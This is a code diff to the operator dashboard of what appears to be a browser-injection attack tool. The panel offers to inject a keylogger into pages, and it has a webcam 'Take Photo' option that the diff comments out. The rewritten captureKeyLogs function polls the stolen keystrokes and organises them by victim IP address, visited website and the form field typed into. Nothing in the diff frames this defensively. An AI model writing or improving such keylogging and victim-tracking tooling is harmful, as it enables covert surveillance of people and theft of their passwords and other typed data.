@@ -91,7 +91,7 @@
               <h4>Keylogger</h4>
               <small>Inject a keylogger into the page.</small>
             </li>
-
+<!-- 
             <li class="list-group-item">
               <div class="onoffswitch">
                 <input type="checkbox" name="takePhoto" class="onoffswitch-checkbox" id="takePhoto">
@@ -102,7 +102,7 @@
               </div>
               <h4>Take Photo</h4>
               <small>Attempt to take a photo with the web cam on the clients computer</small>
-            </li>
+            </li> -->
 
             <li class="list-group-item">
               <div class="onoffswitch">
@@ -396,18 +396,79 @@ function captureKeyLogs() {
     if (data === null) {
       return
     }
-    var lastURL = data[0].Page
-    $('#userLogs').append(lastURL+"<p>")
-    $.each(data, function(i, j) {
-      if ( j.Page === lastURL ) {
-        $('#userLogs').append(j.Content)
-      } else {
-        $('#userLogs').append("<p>"+j.Page)
-        $('#userLogs').append(j.Content)
-      }
-      lastURL = j.Page
-    })
 
+    var theMap = {}
+
+    /*  * read in the json and create the object
+       * the format is:
+            {
+          "ip": {
+              "website": {
+                  "adomObject": [
+                      { "text":"text", "Timestamp": "timestamp"}
+                  ], 
+                  "anotherDomObject": [
+                      "array of text"
+                  ]
+              }   
+          }
+
+        }
+    */
+    $.each(data, function(k, item) { //for each item in the data from the json
+      var ip = item.IP; //store all the data objects
+      var website = item.Page;
+      var domObject = item.DomObject;
+      var content = item.Content;
+      var timestamp = item.Timestamp;
+      if (theMap[ip] == null) { //check if the map[ip] entry exists
+          theMap[ip] = {}
+      }
+      if (theMap[ip][website] == null) { //check whether the map[ip][whebsite] entry exists
+          theMap[ip][website] = {}
+      }
+      if (theMap[ip][website][domObject] == null) { //check whether the dom object for the website exists
+        theMap[ip][website][domObject] = []
+      }
+      var finalObject = {}
+      finalObject["content"] = content //create an object of content against timestamp
+      finalObject["timestamp"] = timestamp 
+      theMap[ip][website][domObject].push(finalObject) //push the object into the map
+    })
+    //once the map is created, create the dom objects to store it
+    $.each(theMap, function(k, v) {
+      var user = document.createElement("div"); //a user object for each user (ip address)
+      user.setAttribute("id", k.replace(/\./g, "_")); //set the id to the ip address
+      user.setAttribute("class", "user")
+      $(user).append("user: " + k) //set the text to the user IP
+
+      //for each website that the user visited
+      $.each(v, function(i,website) {
+        var wDiv = document.createElement("div")
+        wDiv.setAttribute("class", "website")
+        $(wDiv).append("website: " + i)
+        var w = document.createElement("ul");
+        //set the id to the website address replacing weird symbols
+        w.setAttribute("id", i.replace(/\./g, "_").replace(/\//g, "").replace(/:/g, "")); //set the id to the web address
+        //each website will have dom objects that were typed into
+        $.each(website, function(name, object){
+          var listItem = document.createElement("li")
+          listItem.setAttribute("id", name)
+          $(listItem).append(name + ": ")
+          //the data that was typed in stored in an array against the timestamp at which it was saved
+          for (var i = 0, len = object.length; i < len; i++) {
+            $(listItem).append(object[i].content)
+          }
+          $(w).append(listItem)
+        })
+        //append the website div to the website
+        $(wDiv).append(w)
+        //add that to the user object
+        $(user).append(wDiv)
+        //append the user to the page
+        $('#userLogs').append(user)
+      })
+    })
   })
    setTimeout(captureKeyLogs, 5000);
 }
